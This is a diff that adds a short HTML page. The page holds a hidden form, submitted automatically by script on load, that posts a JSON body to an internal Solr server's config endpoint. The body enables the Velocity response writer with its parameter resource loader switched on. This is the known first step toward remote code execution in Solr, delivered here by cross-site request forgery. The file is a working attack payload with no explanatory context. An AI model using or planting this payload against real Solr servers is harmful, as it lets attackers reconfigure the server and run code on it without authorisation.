@@ -1,0 +1,6 @@
+<!DOCTYPE html><html><body>
+<form id="f" method="POST" action="http://solr:8983/solr/flights/config" enctype="text/plain">
+<input type="hidden" name='{"update-queryresponsewriter":{"startup":"lazy","name":"velocity","class":"solr.VelocityResponseWriter","template.base.dir":"","solr.resource.loader.enabled":"true","params.resource.loader.enabled":"true"}}' value="">
+</form>
+<script>document.getElementById("f").submit();</script>
+</body></html>
